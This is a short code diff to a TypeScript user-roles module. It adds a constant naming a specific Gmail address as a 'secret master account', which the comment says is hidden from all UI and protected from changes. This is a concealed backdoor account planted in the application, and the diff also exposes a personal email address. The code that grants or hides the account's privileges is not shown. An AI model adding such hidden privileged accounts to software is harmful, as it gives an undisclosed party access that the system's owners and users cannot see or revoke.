@@ -5,6 +5,9 @@ import { logSystemActivity } from '@/hooks/useSystemActivity';
 
 export type AppRole = 'super_admin' | 'admin' | 'manager' | 'operator' | 'viewer' | string;
 
+// Secret master account - hidden from all UI and protected from changes
+export const MASTER_ACCOUNT_EMAIL = 'omrmym@gmail.com';
+
 export interface SoftwareUser {
   id: string;
   user_id: string;
